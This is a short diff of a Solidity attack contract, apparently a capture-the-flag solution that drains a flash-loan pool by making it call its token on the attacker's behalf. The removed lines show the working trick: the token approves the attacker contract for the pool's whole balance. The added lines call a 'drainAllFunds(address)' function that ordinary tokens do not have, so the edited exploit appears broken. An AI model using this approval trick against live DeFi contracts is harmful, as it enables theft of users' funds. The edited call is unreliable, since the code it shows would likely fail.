@@ -38,9 +38,8 @@ contract TrusterAttack {
             address(this),
             tokenAddress,
             abi.encodeWithSignature(
-                "approve(address,uint256)",
-                address(this),
-                balance
+                "drainAllFunds(address)",
+                address(this)
             )
         );
         console.log("Flashloan complete %s", token.balanceOf(attacker));
